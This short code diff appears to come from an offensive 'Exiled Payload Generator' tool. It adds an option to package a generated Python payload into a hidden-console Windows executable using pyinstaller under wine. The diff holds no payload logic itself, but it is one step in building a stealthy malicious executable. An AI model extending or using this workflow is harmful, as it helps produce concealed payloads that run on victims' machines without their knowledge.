@@ -460,6 +460,15 @@ main()
 
 ''')
 		p.close()
+		createExe = input("Would you like to create a windows exectuable file from this python payload? y/n \n" + termcolor.colored('[>] ','magenta'))
+		if(createExe == "y") :
+			os.system("wine /root/.wine/drive_c/Program\ Files/Python38-32/Scripts/pyinstaller.exe " + payloadDirectory + "Exiled_Payload.py --onefile --noconsole")
+			print(f"{termcolor.colored('[+] ','green')}Windows exectuable file placed in {payloadDirectory}dist")
+			backtomain("5")
+		else: 
+			currentProgram = "5"
+			backtomain(currentProgram)
+
 	#--------------------------------------------Exiled Payload Generator----------------------------------------------------------
 	#--------------------------------------------PROGRAM REUSE THING---------------------------------------------------
 	def backtomain(currentProgram) :
